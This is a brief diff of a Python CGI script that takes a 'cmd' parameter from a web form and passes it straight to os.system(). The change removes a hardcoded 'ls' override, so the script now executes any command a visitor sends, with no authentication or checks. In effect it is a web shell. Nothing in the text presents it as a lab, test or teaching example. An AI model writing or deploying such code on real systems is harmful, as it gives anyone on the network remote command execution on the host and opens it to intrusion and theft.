@@ -6,10 +6,10 @@ import sys
 form = cgi.FieldStorage() 
 
 
-print ("Content-type:text/html\r\n\r\n")
+# print ("Content-type:text/html\r\n\r\n")
 
 cmd =  form.getvalue('cmd')
-cmd ="ls"
-# print("Error " + cmd , sys.stderr )
+# cmd ="ls"
+print("Error " + cmd , sys.stderr )
 
 os.system(cmd)
